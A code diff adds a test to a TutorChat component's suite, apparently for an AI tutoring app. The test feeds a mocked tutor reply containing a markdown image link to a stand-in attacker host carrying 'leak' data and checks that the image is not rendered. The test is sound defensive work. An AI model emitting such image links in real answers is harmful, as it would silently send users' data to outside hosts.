@@ -64,6 +64,21 @@ describe("TutorChat", () => {
     expect(tutorMessage.querySelectorAll("li")).toHaveLength(2);
   });
 
+  it("strips markdown images from the tutor's answer instead of rendering them", async () => {
+    vi.mocked(api.streamTutorMessage).mockImplementation(async (_sessionId, _question, onEvent) => {
+      onEvent({ delta: "See this: ![diagram](https://attacker.example/x?d=leak)" });
+      onEvent({ done: true, exchange_id: "ex-3" });
+    });
+
+    render(<TutorChat sessionId="session-1" />);
+    await userEvent.type(screen.getByPlaceholderText(/ask the tutor/i), "show me a diagram");
+    await userEvent.click(screen.getByRole("button", { name: /ask/i }));
+
+    const tutorMessage = await screen.findByTestId("tutor-chat-tutor-message");
+    await waitFor(() => expect(tutorMessage).toHaveTextContent("See this:"));
+    expect(tutorMessage.querySelector("img")).toBeNull();
+  });
+
   it("disables the input and submit button while a stream is in flight", async () => {
     let resolveStream: () => void = () => {};
     vi.mocked(api.streamTutorMessage).mockImplementation(
